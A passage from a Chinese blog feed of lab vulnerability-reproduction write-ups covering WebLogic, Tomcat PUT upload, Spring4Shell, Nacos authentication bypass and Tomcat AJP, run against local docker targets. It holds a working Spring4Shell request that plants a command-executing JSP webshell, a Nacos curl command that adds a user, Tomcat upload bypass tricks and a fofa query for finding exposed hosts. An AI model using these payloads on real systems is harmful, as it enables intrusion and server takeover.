href="https://xiaojun88.github.io/2022/08/19/CVE-2018-2894%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/19/CVE-2018-2894（Weblogic</a> 任意文件上传漏洞）&#x2F;image-20220820134749793.png)</p><p>上传的木马名为时间戳加文件名</p><p><a href="http://192.168.129.131:7001/ws_utc/css/config/keystore/1660974291672_sun.jsp">http://192.168.129.131:7001/ws_utc/css/config/keystore/1660974291672_sun.jsp</a></p><p>[![image-20220820135803588](D:\blog2\source_posts\Weblogic 任意文件上传漏洞（CVE-2018-2894）.assets\image-20220820135803588.png)](<a href="https://xiaojun88.github.io/2022/08/19/CVE-2018-2894%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/19/CVE-2018-2894（Weblogic</a> 任意文件上传漏洞）&#x2F;image-20220820135803588.png)</p><p>成功上线</p><h5 id="3-关闭环境"><a href="#3-关闭环境" class="headerlink" title="3.关闭环境"></a>3.关闭环境</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker-compose down <span class="hljs-attr">--rmi</span> <span class="hljs-attribute">all</span> -v #关闭并删除环境<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>通过 PUT 方法的 Tomcat 任意写入文件漏洞(CVE-2017-12615)</title>
    <link href="/2023/09/08/%E9%80%9A%E8%BF%87%20PUT%20%E6%96%B9%E6%B3%95%E7%9A%84%20Tomcat%20%E4%BB%BB%E6%84%8F%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E(CVE-2017-12615)/"/>
    <url>/2023/09/08/%E9%80%9A%E8%BF%87%20PUT%20%E6%96%B9%E6%B3%95%E7%9A%84%20Tomcat%20%E4%BB%BB%E6%84%8F%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E(CVE-2017-12615)/</url>
    
    <content type="html"><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>org.apache.jasper.servlet.JspServlet：默认处理jsp，jspx文件请求，不存在PUT上传逻辑，无法处理PUT请求<br>org.apache.catalina.servlets.DefaultServlet：默认处理静态文件（除jsp，jspx之外的文件），存在PUT上传处理逻辑，可以处理PUT请求。<br>所以我们即使可以PUT一个文件到服务器但也无法直接PUT以jsp，jspx结尾文件，因为这些这些后缀的文件都是交由JspServlet处理的，它没法处理PUT请求。<br>但是当我们利用Windows特性以下面两种方式上传文件时，tomcat并不认为其是jsp文件从而交由DefaultServlet处理，从而成功创建jsp文件。</p><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1.Tomcat 5.X- 9.X</p><p>2.配置文件&#x2F;conf&#x2F;web.xml中readonly&#x3D;false</p><p>[![image-20220818093734016](D:\blog2\source_posts\通过 PUT 方法的 Tomcat 任意写入文件漏洞(CVE-2017-12615).assets\image-20220818093734016.png)](<a href="https://xiaojun88.github.io/2022/08/17/CVE-2017-12615%EF%BC%88%E9%80%9A%E8%BF%87">https://xiaojun88.github.io/2022/08/17/CVE-2017-12615（通过</a> PUT 方法的 Tomcat 任意写入文件漏洞）&#x2F;image-20220818093734016.png)</p><p>image-20220818093734016</p><h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>攻击机：192.168.129.128_window10</p><p>靶机 ：192.168.129.130_kali</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h5><p>在靶机中使用docker搭建</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker-compose build <span class="hljs-comment">#进行编译</span><br><br>docker-compose up -d <span class="hljs-comment">#运行靶场</span><br><br>docker ps <span class="hljs-comment">#查看容器</span><br><br><span class="hljs-keyword">SHELL</span><br></code></pre></td></tr></table></figure><p>[![image-20220818092525460](D:\blog2\source_posts\通过 PUT 方法的 Tomcat 任意写入文件漏洞(CVE-2017-12615).assets\image-20220818092525460.png)](<a href="https://xiaojun88.github.io/2022/08/17/CVE-2017-12615%EF%BC%88%E9%80%9A%E8%BF%87">https://xiaojun88.github.io/2022/08/17/CVE-2017-12615（通过</a> PUT 方法的 Tomcat 任意写入文件漏洞）&#x2F;image-20220818092525460.png)</p><p>image-20220818092525460</p><h5 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h5><p>利用PUT方法上传一句话木马，如何是linux操作系统给后缀后加“&#x2F;”或“20%”，windos系统给后缀添加”::$DATA“进行绕过</p><p>1.”&#x2F;“</p><p>[![image-20220818103253553](D:\blog2\source_posts\通过 PUT 方法的 Tomcat 任意写入文件漏洞(CVE-2017-12615).assets\image-20220818103253553.png)](<a href="https://xiaojun88.github.io/2022/08/17/CVE-2017-12615%EF%BC%88%E9%80%9A%E8%BF%87">https://xiaojun88.github.io/2022/08/17/CVE-2017-12615（通过</a> PUT 方法的 Tomcat 任意写入文件漏洞）&#x2F;image-20220818103253553.png)</p><p>image-20220818103253553</p><p>2.“20%”</p><p>[![image-20220818104946309](D:\blog2\source_posts\通过 PUT 方法的 Tomcat 任意写入文件漏洞(CVE-2017-12615).assets\image-20220818104946309.png)](<a href="https://xiaojun88.github.io/2022/08/17/CVE-2017-12615%EF%BC%88%E9%80%9A%E8%BF%87">https://xiaojun88.github.io/2022/08/17/CVE-2017-12615（通过</a> PUT 方法的 Tomcat 任意写入文件漏洞）&#x2F;image-20220818104946309.png)</p><p>image-20220818104946309</p><p>3.”::$DATA“[![image-20220818104853003](D:\blog2\source_posts\通过 PUT 方法的 Tomcat 任意写入文件漏洞(CVE-2017-12615).assets\image-20220818104853003.png)](<a href="https://xiaojun88.github.io/2022/08/17/CVE-2017-12615%EF%BC%88%E9%80%9A%E8%BF%87">https://xiaojun88.github.io/2022/08/17/CVE-2017-12615（通过</a> PUT 方法的 Tomcat 任意写入文件漏洞）&#x2F;image-20220818104853003.png)</p><p>image-20220818104853003</p><p>使用蚁剑连接</p><p>[![image-20220818104442331](D:\blog2\source_posts\通过 PUT 方法的 Tomcat 任意写入文件漏洞(CVE-2017-12615).assets\image-20220818104442331.png)](<a href="https://xiaojun88.github.io/2022/08/17/CVE-2017-12615%EF%BC%88%E9%80%9A%E8%BF%87">https://xiaojun88.github.io/2022/08/17/CVE-2017-12615（通过</a> PUT 方法的 Tomcat 任意写入文件漏洞）&#x2F;image-20220818104442331.png)</p><p>image-20220818104442331</p><p>成功上线</p><p>[![image-20220818104404948](D:\blog2\source_posts\通过 PUT 方法的 Tomcat 任意写入文件漏洞(CVE-2017-12615).assets\image-20220818104404948.png)](<a href="https://xiaojun88.github.io/2022/08/17/CVE-2017-12615%EF%BC%88%E9%80%9A%E8%BF%87">https://xiaojun88.github.io/2022/08/17/CVE-2017-12615（通过</a> PUT 方法的 Tomcat 任意写入文件漏洞）&#x2F;image-20220818104404948.png)</p><p>image-20220818104404948</p><h5 id="3-关闭环境"><a href="#3-关闭环境" class="headerlink" title="3.关闭环境"></a>3.关闭环境</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker-compose down <span class="hljs-attr">--rmi</span> <span class="hljs-attribute">all</span> -v #关闭并删除环境<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Spring Framework RCE 通过 JDK 9+ 上的数据绑定(CVE-2022-22965)</title>
    <link href="/2023/09/02/Spring%20Framework%20RCE%20%E9%80%9A%E8%BF%87%20JDK%209+%20%E4%B8%8A%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A(CVE-2022-22965)/"/>
    <url>/2023/09/02/Spring%20Framework%20RCE%20%E9%80%9A%E8%BF%87%20JDK%209+%20%E4%B8%8A%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A(CVE-2022-22965)/</url>
    
    <content type="html"><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Spring framework 是Spring 里面的一个基础开源框架，其目的是用于简化 Java 企业级应用的开发难度和开发周期，在Spring框架的JDK9版本(及以上版本)中，远程攻击者可在满足特定条件的基础上，通过框架的参数绑定功能获取AccessLogValve对象并诸如恶意字段值，从而触发pipeline机制并写入任意路径下的文件。</p><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1、JDK9+<br>2、Spring Framework &lt; 5.3.18或Spring Framework &lt; 5.2.20</p><h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>攻击机：192.168.129.128_window10</p><p>靶机 ：192.168.129.130_kali</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h5><p>在靶机中使用docker搭建</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker-compose build <span class="hljs-comment">#进行编译</span><br><br>docker-compose up -d <span class="hljs-comment">#运行靶场</span><br><br>docker ps  <span class="hljs-comment">#查看容器</span><br><br><span class="hljs-keyword">SHELL</span><br></code></pre></td></tr></table></figure><p>[![image-20220817172118999](D:\blog2\source_posts\Spring Framework RCE 通过 JDK 9+ 上的数据绑定(CVE-2022-22965).assets\image-20220817172118999.png)](<a href="https://xiaojun88.github.io/2022/08/16/CVE-2022-22965">https://xiaojun88.github.io/2022/08/16/CVE-2022-22965</a>(Spring Framework RCE 通过 JDK 9+ 上的数据绑定)&#x2F;image-20220817172118999.png)</p><p>image-20220817172118999</p><h5 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h5><p>根据提示访问<a href="http://192.168.129.130:8080/?name=Bob&age=1">http://192.168.129.130:8080/?name=Bob&amp;age=1</a></p><p>[![image-20220817172807959](D:\blog2\source_posts\Spring Framework RCE 通过 JDK 9+ 上的数据绑定(CVE-2022-22965).assets\image-20220817172807959.png)](<a href="https://xiaojun88.github.io/2022/08/16/CVE-2022-22965">https://xiaojun88.github.io/2022/08/16/CVE-2022-22965</a>(Spring Framework RCE 通过 JDK 9+ 上的数据绑定)&#x2F;image-20220817172807959.png)</p><p>image-20220817172807959</p><p>利用思路为：利⽤class对象构造利⽤链，对Tomcat的日志配置进行修改，然后，向⽇志中写⼊shell</p><p>按照以下格式，构造payload</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">class<span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.classLoader</span><span class="hljs-selector-class">.resources</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.parent</span><span class="hljs-selector-class">.pipeline</span><span class="hljs-selector-class">.first</span>.pattern=    <br>shell代码（需要url编码）<br><br>class<span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.classLoader</span><span class="hljs-selector-class">.resources</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.parent</span><span class="hljs-selector-class">.pipeline</span><span class="hljs-selector-class">.first</span>.suffix=<br>修改tomcat日志文件后缀<br><br>class<span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.classLoader</span><span class="hljs-selector-class">.resources</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.parent</span><span class="hljs-selector-class">.pipeline</span><span class="hljs-selector-class">.first</span>.directory=<br>写入文件所在的网站根目录<br><br>class<span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.classLoader</span><span class="hljs-selector-class">.resources</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.parent</span><span class="hljs-selector-class">.pipeline</span><span class="hljs-selector-class">.first</span>.prefix=<br>写入文件名称<br><br>class<span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.classLoader</span><span class="hljs-selector-class">.resources</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.parent</span><span class="hljs-selector-class">.pipeline</span><span class="hljs-selector-class">.first</span>.fileDateFormat=<br>文件日期格式（实际构造为空值即可）<br><br>URL<br></code></pre></td></tr></table></figure><p>访问<a href="http://192.168.129.130:8080/">http://192.168.129.130:8080</a></p><p>并抓包，构造以下pyload，进行重放</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%<span class="hljs-number">25</span>%<span class="hljs-number">7</span>Bc2%<span class="hljs-number">7</span>Di%<span class="hljs-number">20</span>if(%<span class="hljs-number">22</span>j%<span class="hljs-number">22</span>.equals(request.getParameter(%<span class="hljs-number">22</span>pwd%<span class="hljs-number">22</span>)))%<span class="hljs-number">7</span>B%<span class="hljs-number">20</span>java.io.InputStream%<span class="hljs-number">20</span>in%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>D%<span class="hljs-number">20</span>%<span class="hljs-number">25</span>%<span class="hljs-number">7</span>Bc1%<span class="hljs-number">7</span>Di.getRuntime().exec(request.getParameter(%<span class="hljs-number">22</span>cmd%<span class="hljs-number">22</span>)).getInputStream()%<span class="hljs-number">3</span>B%<span class="hljs-number">20</span>int%<span class="hljs-number">20</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>D%<span class="hljs-number">20</span>-<span class="hljs-number">1</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">20</span>byte%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D%<span class="hljs-number">20</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>D%<span class="hljs-number">20</span>new%<span class="hljs-number">20</span>byte%<span class="hljs-number">5</span>B2048%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>B%<span class="hljs-number">20</span>while((a%<span class="hljs-number">3</span>Din.read(b))!%<span class="hljs-number">3</span>D-<span class="hljs-number">1</span>)%<span class="hljs-number">7</span>B%<span class="hljs-number">20</span>out.println(new%<span class="hljs-number">20</span>String(b))%<span class="hljs-number">3</span>B%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>D%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>D%<span class="hljs-number">20</span>%<span class="hljs-number">25</span>%<span class="hljs-number">7</span>Bsuffix%<span class="hljs-number">7</span>Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT/&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=sun&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.129.130:8080</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>: */*<br><span class="hljs-attribute">Accept</span>-Language: en<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">97</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4692</span>.<span class="hljs-number">71</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">suffix</span>: %&gt;//<br><span class="hljs-attribute">c1</span>: Runtime<br><span class="hljs-attribute">c2</span>: &lt;%<br><span class="hljs-attribute">DNT</span>: <span class="hljs-number">1</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">0</span><br><br><span class="hljs-attribute">HTTP</span><br></code></pre></td></tr></table></figure><p>[![image-20220817202902291](D:\blog2\source_posts\Spring Framework RCE 通过 JDK 9+ 上的数据绑定(CVE-2022-22965).assets\image-20220817202902291.png)](<a href="https://xiaojun88.github.io/2022/08/16/CVE-2022-22965">https://xiaojun88.github.io/2022/08/16/CVE-2022-22965</a>(Spring Framework RCE 通过 JDK 9+ 上的数据绑定)&#x2F;image-20220817202902291.png)</p><p>image-20220817202902291</p><p>webshell成功写入</p><p>执行whoami命令（由于尝试阶段，写了很多次shell，所以代码有点乱）</p><p><a href="http://192.168.129.130:8080/sun.jsp?pwd=j&cmd=whoami">http://192.168.129.130:8080/sun.jsp?pwd=j&amp;cmd=whoami</a></p><p>[![image-20220817204123332](D:\blog2\source_posts\Spring Framework RCE 通过 JDK 9+ 上的数据绑定(CVE-2022-22965).assets\image-20220817204123332.png)](<a href="https://xiaojun88.github.io/2022/08/16/CVE-2022-22965">https://xiaojun88.github.io/2022/08/16/CVE-2022-22965</a>(Spring Framework RCE 通过 JDK 9+ 上的数据绑定)&#x2F;image-20220817204123332.png)</p><p>image-20220817204123332</p><p>执行ls命令：</p><p><a href="http://192.168.129.130:8080/sun.jsp?pwd=j&cmd=ls">http://192.168.129.130:8080/sun.jsp?pwd=j&amp;cmd=ls</a></p><p>[![image-20220817204341340](D:\blog2\source_posts\Spring Framework RCE 通过 JDK 9+ 上的数据绑定(CVE-2022-22965).assets\image-20220817204341340.png)](<a href="https://xiaojun88.github.io/2022/08/16/CVE-2022-22965">https://xiaojun88.github.io/2022/08/16/CVE-2022-22965</a>(Spring Framework RCE 通过 JDK 9+ 上的数据绑定)&#x2F;image-20220817204341340.png)</p><p>image-20220817204341340</p><h5 id="3-关闭环境"><a href="#3-关闭环境" class="headerlink" title="3.关闭环境"></a>3.关闭环境</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker-compose down <span class="hljs-attr">--rmi</span> <span class="hljs-attribute">all</span> -v #关闭并删除环境<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Nacos 身份验证绕过(CVE-2021-29441Nacos)</title>
    <link href="/2023/09/01/Nacos%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87(CVE-2021-29441Nacos)/"/>
    <url>/2023/09/01/Nacos%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87(CVE-2021-29441Nacos)/</url>
    
    <content type="html"><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Nacos 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。<br>该漏洞发生在nacos在进行认证授权操作时，会判断请求的user-agent是否为”Nacos-Server”，如果是的话则不进行任何认证。开发者原意是用来处理一些服务端对服务端的请求。但是由于配置的过于简单，并且将协商好的user-agent设置为Nacos-Server，直接硬编码在了代码里，导致了漏洞的出现。并且利用这个未授权漏洞，攻击者可以获取到用户名密码等敏感信息。</p><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1.Nacos &lt;&#x3D; 2.0.0-ALPHA.1</p><h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>攻击机：192.168.129.128_window10、192.168.129.130_kali</p><p>靶机 ：192.168.129.131_centos</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h5><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker-compose build <span class="hljs-comment">#进行编译</span><br><br>docker-compose up -d <span class="hljs-comment">#运行靶场</span><br><br>docker ps  <span class="hljs-comment">#查看容器</span><br><br><span class="hljs-keyword">SHELL</span><br></code></pre></td></tr></table></figure><p>[![image-20220815211759633](D:\blog2\source_posts\Nacos 身份验证绕过(CVE-2021-29441Nacos).assets\image-20220815211759633.png)](<a href="https://xiaojun88.github.io/2022/08/15/CVE-2021-29441">https://xiaojun88.github.io/2022/08/15/CVE-2021-29441</a>(Nacos 身份验证绕过)&#x2F;image-20220815211759633.png)</p><p>image-20220815211759633</p><p>发现开放了8848、9555、3306、33060端口</p><h5 id="2-漏洞验证"><a href="#2-漏洞验证" class="headerlink" title="2.漏洞验证"></a>2.漏洞验证</h5><p>访问<a href="http://192.168.129.131:8848/nacos/#/login">http://192.168.129.131:8848/nacos/#/login</a></p><p>[![image-20220815212559303](D:\blog2\source_posts\Nacos 身份验证绕过(CVE-2021-29441Nacos).assets\image-20220815212559303.png)](<a href="https://xiaojun88.github.io/2022/08/15/CVE-2021-29441">https://xiaojun88.github.io/2022/08/15/CVE-2021-29441</a>(Nacos 身份验证绕过)&#x2F;image-20220815212559303.png)</p><p>image-20220815212559303</p><p>执行一个只能登录后才能实现的操作（查看已有的用户）</p><p><a href="http://192.168.129.131:8848/nacos/v1/auth/users?pageNo=1&pageSize=2">http://192.168.129.131:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=2</a></p><p>[![image-20220815221511755](D:\blog2\source_posts\Nacos 身份验证绕过(CVE-2021-29441Nacos).assets\image-20220815221511755.png)](<a href="https://xiaojun88.github.io/2022/08/15/CVE-2021-29441">https://xiaojun88.github.io/2022/08/15/CVE-2021-29441</a>(Nacos 身份验证绕过)&#x2F;image-20220815221511755.png)</p><p>image-20220815221511755</p><p>被禁止访问</p><p>再次访问以上操作，用bp抓包，发送到repeater模块，并将<code>User-Agent</code>的值修改为<code>Nacos-Server</code>，看下200返回包</p><p>[![image-20220815223545251](D:\blog2\source_posts\Nacos 身份验证绕过(CVE-2021-29441Nacos).assets\image-20220815223545251.png)](<a href="https://xiaojun88.github.io/2022/08/15/CVE-2021-29441">https://xiaojun88.github.io/2022/08/15/CVE-2021-29441</a>(Nacos 身份验证绕过)&#x2F;image-20220815223545251.png)</p><p>image-20220815223545251</p><p>从反应包中可以看到，用户名和加密过后的密码</p><h5 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.漏洞利用"></a>3.漏洞利用</h5><p>使用kalii执行以下命令，添加一个名为sun的新用户</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">curl -XPOST &#x27;http://192.168.129.131:<span class="hljs-number">8848</span>/nacos/v1/auth/users?username=sun&amp;password=sun&#x27; -H &#x27;User-Agent: Nacos-Server&#x27;<br><br>SHELL<br></code></pre></td></tr></table></figure><p>[![image-20220815230803011](D:\blog2\source_posts\Nacos 身份验证绕过(CVE-2021-29441Nacos).assets\image-20220815230803011.png)](<a href="https://xiaojun88.github.io/2022/08/15/CVE-2021-29441">https://xiaojun88.github.io/2022/08/15/CVE-2021-29441</a>(Nacos 身份验证绕过)&#x2F;image-20220815230803011.png)</p><p>image-20220815230803011</p><p>再次执行查看用户列表的操作，可以看到sun用户</p><p><a href="http://192.168.129.131:8848/nacos/v1/auth/users?pageNo=1&pageSize=2">http://192.168.129.131:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=2</a></p><p>[![image-20220815231136551](D:\blog2\source_posts\Nacos 身份验证绕过(CVE-2021-29441Nacos).assets\image-20220815231136551.png)](<a href="https://xiaojun88.github.io/2022/08/15/CVE-2021-29441">https://xiaojun88.github.io/2022/08/15/CVE-2021-29441</a>(Nacos 身份验证绕过)&#x2F;image-20220815231136551.png)</p><p>image-20220815231136551</p><p>使用sun用户进行登录，成功进入</p><p>[![image-20220815231718604](D:\blog2\source_posts\Nacos 身份验证绕过(CVE-2021-29441Nacos).assets\image-20220815231718604.png)](<a href="https://xiaojun88.github.io/2022/08/15/CVE-2021-29441">https://xiaojun88.github.io/2022/08/15/CVE-2021-29441</a>(Nacos 身份验证绕过)&#x2F;image-20220815231718604.png)</p><p>image-20220815231718604</p><h5 id="4-关闭环境"><a href="#4-关闭环境" class="headerlink" title="4.关闭环境"></a>4.关闭环境</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">docker-compose down <span class="hljs-attr">--rmi</span> <span class="hljs-attribute">all</span> -v #关闭并删除环境<br><br>SHELL<br></code></pre></td></tr></table></figure><p>(fofa关键字：<code>title=&quot;nacos&quot;</code>)</p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Aapache Tomcat AJP 任意文件读取包含漏洞（CVE-2020-1938）</title>
    <link href="/2023/08/20/Aapache%20Tomcat%20AJP%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1938%EF%BC%89/"/>
    <url>/2023/08/20/Aapache%20Tomcat%20AJP%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1938%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Tomcat在默认的conf&#x2F;server.xml中配置了2个Connector，一个默认监听8080端口处理HTTP请求，另外一个默认监听8009端口处理AJP请求，方便与其他Web服务器通过AJP协议进行交互。由于Tomcat AJP协议存在缺陷，致使攻击者可以控制三个参数javax.servlet.include.request_uri、javax.servlet.include.path_info、javax.servlet.include.servlet_path，通过构造特定参数读取webapp目录下的任意文件或包含文件，如：webapp 配置文件或源代码等。</p><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1.版本为Apache Tomcat 9.x &lt; 9.0.31、8.x &lt; 8.5.51、7.x &lt; 7.0.100、6.x</p><p>2.AJP服务的端口开放（默认8009）</p><h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>攻击机：192.168.129.128_window10、192.168.129.130_kali</p><p>靶机 ：192.168.129.131_centos</p><p>poc：<a href="https://github.com/sv3nbeast/CVE-2020-1938-Tomact-file_include-file_read">https://github.com/sv3nbeast/CVE-2020-1938-Tomact-file_include-file_read</a></p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h5><p>在靶机中使用docker搭建</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker-compose build <span class="hljs-comment">#进行编译</span><br><br>docker-compose up -d <span class="hljs-comment">#运行靶场</span><br><br><span class="hljs-keyword">SHELL</span><br></code></pre></td></tr></table></figure><p>[![image-20220814221907783](D:\blog2\source_posts\Aapache Tomcat AJP 任意文件读取包含漏洞（CVE-2020-1938）.assets\image-20220814221907783.png)](<a href="https://xiaojun88.github.io/2022/08/14/CVE-2020-1938%EF%BC%88Aapache">https://xiaojun88.github.io/2022/08/14/CVE-2020-1938（Aapache</a> Tomcat AJP 任意文件读取包含漏洞）&#x2F;image-20220814221907783.png)</p><p>image-20220814221907783</p><h5 id="2-漏洞验证"><a href="#2-漏洞验证" class="headerlink" title="2.漏洞验证"></a>2.漏洞验证</h5><p>查看靶机开放端口</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -Pn -sV -T4 -O <span 